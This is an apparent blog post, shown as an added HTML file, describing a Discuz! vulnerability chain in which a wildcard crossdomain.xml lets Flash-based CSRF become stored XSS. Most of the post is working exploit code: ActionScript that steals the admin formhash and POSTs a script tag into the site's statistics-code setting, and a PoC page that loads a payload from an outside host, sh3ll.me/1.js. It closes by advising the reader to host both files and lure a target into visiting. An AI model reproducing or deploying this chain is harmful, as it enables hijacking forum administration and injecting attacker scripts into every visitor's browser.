@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>Discuz! Flash CSRF To Stored XSS - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.ee4a618df935f0a2b9d9e99663fcbefb3605c141a5835bb785b399615d5fac1e.css" integrity="sha256-7kphjfk18KK52emWY/y&#43;&#43;zYFwUGlg1u3hbOZYV1frB4=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>Discuz! Flash CSRF To Stored XSS</h1>
+        <div>
+            <time datetime="2014-07-02 21:24:40 +0800 CST">发布时间: 2014-07-02 21:24</time>
+            <time datetime="2014-07-02 21:24:40 +0800 CST">更新时间: 2014-07-02 21:24</time>
+        </div>
+    </header>
+
+    <section>
+    <p>Discuz! 的 crossdomain.xml 一直是个大问题，默认的 crossdomain.xml 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;cross-domain-policy&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;allow-access-from</span> <span style="color:#a6e22e">domain=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/cross-domain-policy&gt;</span>
+</span></span></code></pre></div><p>这里，allow-access-from domain 被设置成了 * ，意味着任意站点的 flash 文件都可以对 dz 站点发起 http 请求。</p>
+<p>而 discuz 后台的操作只验证了 referer头（因为 flash 可以进行 http 请求，所以对 token 的验证可以 bypass ），referer 头可以通过从 https 站点向 http 站点访问绕过。更有甚者，有一些神奇的插件，使得我们可以访问到上传到 discuz 站点的 flash 文件，直接免去了 referer 头的问题。</p>
+<p>后台的 “全局 － 站点信息 － 网站第三方统计代码” 处，可以通过 script 标签引入js，前台访问直接触发，相当于构造了一枚完美的存储型 xss。</p>
+<p>以上 3 点，导致了 flash csrf 向存储型 xss 的转变。</p>
+<p>首先，编写用于发送请求的 flash，as3 代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">package</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">display</span>.<span style="color:#a6e22e">Sprite</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">events</span>.<span style="color:#a6e22e">Event</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">external</span>.<span style="color:#a6e22e">ExternalInterface</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">URLLoader</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">URLRequest</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">URLRequestMethod</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">discuz</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Sprite</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span>String <span style="color:#f92672">=</span> <span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">loaderInfo</span>.<span style="color:#a6e22e">parameters</span>[<span style="color:#e6db74">&#34;url&#34;</span>];
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">scriptSrc</span><span style="color:#f92672">:</span>String <span style="color:#f92672">=</span> <span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">loaderInfo</span>.<span style="color:#a6e22e">parameters</span>[<span style="color:#e6db74">&#34;src&#34;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">discuz</span>()
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">urlHash</span><span style="color:#f92672">:</span>String <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;admin.php?action=setting&amp;operation=basic&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">urlHash</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">/*HTTP GET
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                        *@url, 要请求的 URL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                        */</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loader</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLLoader</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLLoader</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">loader</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#a6e22e">Event</span>.<span style="color:#a6e22e">COMPLETE</span>, <span style="color:#a6e22e">getFormHash</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLRequest</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLRequest</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">loader</span>.<span style="color:#a6e22e">load</span>(<span style="color:#a6e22e">request</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">data</span>)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">/*HTTP POST
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                        *@url, 要请求的 URL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                        *@data, POST 的数据
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                        */</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loader</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLLoader</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLLoader</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLRequest</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLRequest</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">URLRequestMethod</span>.<span style="color:#a6e22e">POST</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">loader</span>.<span style="color:#a6e22e">load</span>(<span style="color:#a6e22e">request</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getFormHash</span>(<span style="color:#a6e22e">event</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Event</span>)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">//获取formhash 后回调，写js.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loader</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLLoader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">URLLoader</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">target</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pattern</span><span style="color:#f92672">:</span>RegExp <span style="color:#f92672">=</span> <span style="color:#e6db74">/&lt;input type=&#34;hidden&#34; name=&#34;formhash&#34; value=&#34;(\w{8})&#34; \/&gt;/</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">formhash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pattern</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">loader</span>.<span style="color:#a6e22e">data</span>)[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">urlPost</span><span style="color:#f92672">:</span>String <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;admin.php&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;script src=&#39;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">scriptSrc</span> <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;&gt;&lt;/script&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;action=setting&amp;edit=yes&amp;formhash=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">formhash</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;scrolltop=%0d&amp;anchor=%0d&amp;operation=basic&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">data</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&amp;settingnew%5bbbname%5d=Discuz%21+Board&amp;settingnew%5bsitename%5d=Comsenz+Inc.&amp;settingnew%&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">data</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;5bsiteurl%5d=http%3a%2f%2fwww.comsenz.com%2f&amp;settingnew%5badminemail%5d=admin@admin.com&amp;s&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">data</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;ettingnew%5bsite_qq%5d=%0d&amp;settingnew%5bicp%5d=%0d&amp;settingnew%5bboardlicensed%5d=0&amp;settin&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">data</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;gnew%5bstatcode%5d=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">script</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;settingnew%5bbbclosed%5d=0&amp;settingnew%5bclosedreason%5d=%0d&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">data</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&amp;settingnew%5bclosedallowactivation%5d=0&amp;settingsubmit=%cc%e1%bd%bb&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">urlPost</span>, <span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>利用页面 poc.html：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;FlashCSRF POC&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h1</span>&gt;Hacked by Chu&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">classid</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&#34;</span> <span style="color:#a6e22e">codebase</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FlashVars&#34;</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;middle&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">allowScriptAccess</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;always&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">movie</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost/discuz.swf&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">FlashVars</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url=http://localhost/dz3/&amp;src=http://sh3ll.me/1.js&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">quality</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;high&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">embed</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost/discuz.swf&#34;</span> <span style="color:#a6e22e">quality</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;high&#34;</span> <span style="color:#a6e22e">bgcolor</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#ffffff&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FlashVars&#34;</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;middle&#34;</span> <span style="color:#a6e22e">allowScriptAccess</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;always&#34;</span> <span style="color:#a6e22e">FlashVars</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url=http://localhost/dz3/&amp;src=http://sh3ll.me/1.js&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application/x-shockwave-flash&#34;</span> <span style="color:#a6e22e">pluginspage</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.macromedia.com/go/getflashplayer&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&lt;</span>/object/&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>然后，只要我们把这两个文件放在https服务器上，诱使目标访问即可，为了演示攻击效果，我做了个 gif 图片（图片有点大，耐心等待 :D）：</p>
+<p><img src="discuz-flash-csrf-to-xss.gif" alt=""></p>
+
+    </section>
+</article>
+</main>
+  </body>
+</html>
